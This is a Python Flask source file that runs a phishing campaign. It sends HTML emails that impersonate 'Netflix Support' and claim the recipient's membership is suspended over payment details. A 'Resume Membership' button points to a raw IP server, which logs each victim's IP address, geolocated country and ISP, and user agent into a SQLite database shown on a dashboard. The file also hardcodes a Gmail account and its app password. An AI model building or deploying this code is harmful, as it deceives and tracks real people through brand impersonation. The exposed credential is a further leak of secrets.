from flask import Flask, request, send_file, jsonify, render_template
import sqlite3
import datetime
from pytz import timezone 
import smtplib
import requests
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

app = Flask(__name__)

def get_location(ip_address):
    try:
        # Replace `YOUR_API_KEY` with your API key if required
        response = requests.get(f"https://api.iplocation.net/?ip={ip_address}")
        if response.status_code == 200:
            data = response.json()
            # Concatenate city and country for a readable format
            return f"{data.get('country_name', 'Unknown')}, {data.get('isp', 'Unknown')}"
    except Exception as e:
        print(f"Error fetching location for IP {ip_address}: {e}")
    return "Unknown"

# Function to log email open events
def log_open_event(email_id, sequence_id, ip, location, user_agent):
    conn = sqlite3.connect("emails.db")
    cursor = conn.cursor()
    cursor.execute("""
        UPDATE emails
        SET opened = 1, opened_timestamp = ?, ip_address = ?, location = ?, user_agent = ?
        WHERE recipient = ? AND sequence_id = ?
    """, (datetime.datetime.now(timezone("Asia/Kolkata")).strftime('%d-%m-%Y %H:%M:%S'), ip, location, user_agent, email_id, sequence_id))
    conn.commit()
    conn.close()


def send_html_email(email_id, sequence_id, recipient_email, plain_text_content):
    sender_email = "chandrayaan2iit@gmail.com"
    sender_email = email_id
    custom_sender_name = "Netflix Support"
    subject = "Your Netflix Membership Has Been Suspended"
    smtp_server = "smtp.gmail.com"
    smtp_port = 587
    password = "mjvv ogzx hfzj tsqy"  # Use app-specific password for Gmail

    msg = MIMEMultipart('mixed')
    msg['From'] = f"{custom_sender_name} <{sender_email}>"
    msg['To'] = recipient_email
    msg['Subject'] = subject

    # Netflix-style email content with a suspension message
    tracking_form = f'''
    <html>
        <body style="font-family: Arial, sans-serif; background-color: #141414; color: #fff; margin: 0; padding: 0;">
            <div style="text-align: center; padding: 40px;">
                <img src="http://98.70.55.159:8080/static/images/netflix.png" alt="Netflix Logo" style="width: 250px; margin-bottom: 20px;">
                
                <h1 style="font-size: 32px; font-weight: bold; color: #e50914;">Hello,</h1>
                
                <p style="font-size: 18px; line-height: 1.6; color: #fff; margin-bottom: 30px;">
                    We're sorry to inform you that your Netflix account has been temporarily suspended due to an issue with your payment details.
                </p>
                <p style="font-size: 18px; line-height: 1.6; color: #fff; margin-bottom: 30px;">
                    To continue enjoying your favorite shows and movies, click the button below to resolve the issue and resume your membership.
                </p>
                
                <!-- Flashy Submit Button -->
                <!--
                <form id="trackingForm" method="POST" action="https://98.70.55.159:8080/track_open/{email_id}/{sequence_id}">
                    <button type="submit" style="background-color: #e50914; color: white; font-size: 24px; font-weight: bold; padding: 20px 40px; border-radius: 5px; border: none; cursor: pointer; transition: background-color 0.3s, transform 0.2s;">
                        Resume Membership
                    </button>
                </form>
                -->

                <a href="http://98.70.55.159:8080/track_open/{recipient_email}/{sequence_id}">
                    <button type="submit" style="background-color: #e50914; color: white; font-size: 24px; font-weight: bold; padding: 20px 40px; border-radius: 5px; border: none; cursor: pointer; transition: background-color 0.3s, transform 0.2s;">
                        Resume Membership
                    </button>
                </a>

                
                <!-- Flashy button hover effect -->
                <style>
                    button:hover {{
                        background-color: #f40612;
                        transform: scale(1.05);
                    }}
                    button:focus {{
                        outline: none;
                    }}
                </style>
            </div>

            <footer style="text-align: center; padding: 20px; background-color: #333; color: #999; font-size: 14px;">
                <p>Netflix, Inc. | 100 Winchester Circle, Los Gatos, CA 95032</p>
            </footer>
        </body>
    </html>
    '''

    msg.attach(MIMEText(tracking_form, 'html'))
    msg.attach(MIMEText(plain_text_content))

    with smtplib.SMTP(smtp_server, smtp_port) as server:
        server.starttls()  # Secure the connection
        server.login(sender_email, password)
        server.sendmail(sender_email, recipient_email, msg.as_string())
    print("Email sent successfully!")

# Route to serve index.html
@app.route("/")
def home():
    return render_template("index.html")


@app.route("/track_open/<email_id>/<sequence_id>", methods=["GET", "POST"])
def track_open(email_id, sequence_id):
    ip = request.remote_addr
    user_agent = request.headers.get("User-Agent")
    location = get_location(ip)
    
    # Log open event to database
    log_open_event(email_id, sequence_id, ip, location, user_agent)
    
    # Return a simple 204 response (empty response with no content)
    return '', 204  # No content, since we're just logging the open event via form submission


# Route to handle email sending
@app.route("/send_email", methods=["GET", "POST"])
def send_email():
    if request.method == "GET":
        return render_template("send_email.html")
    
    data = request.json
    recipient = data.get("recipient")
    content = data.get("content")  # Get the email text content from the request

    email_id = "chandrayaan2iit@gmail.com"

    # Check if this email_id already exists and get the latest sequence_id
    conn = sqlite3.connect("emails.db")
    cursor = conn.cursor()
    cursor.execute("SELECT MAX(sequence_id) FROM emails WHERE recipient = ?", (recipient,))
    result = cursor.fetchone()
    sequence_id = (result[0] + 1) if result[0] is not None else 1  # Increment if exists, else start at 1

    # Log email in database
    cursor.execute("""
        INSERT INTO emails (email_id, sequence_id, recipient, sent_timestamp, opened)
        VALUES (?, ?, ?, ?, 0)
    """, (email_id, sequence_id, recipient, datetime.datetime.now(timezone("Asia/Kolkata")).strftime('%d-%m-%Y %H:%M:%S')))
    conn.commit()
    conn.close()
    
    # Send email with tracking pixel
    send_html_email(email_id, sequence_id, recipient, content)  # Pass content as plain text message
    
    return jsonify({"status": "email sent", "email_id": email_id, "sequence_id": sequence_id})

# Route to get list of emails and metadata

@app.route("/emails")
def get_emails():
    conn = sqlite3.connect("emails.db")
    cursor = conn.cursor()
    cursor.execute("""
        SELECT sno, email_id, sequence_id, recipient, sent_timestamp, opened, opened_timestamp, ip_address, location, user_agent
        FROM emails
    """)
    emails = cursor.fetchall()
    conn.close()

    # Pass the data to the template
    return render_template("email_dashboard.html", emails=emails)

    
if __name__ == "__main__":
    app.run(debug=False, host="0.0.0.0", port=8080)
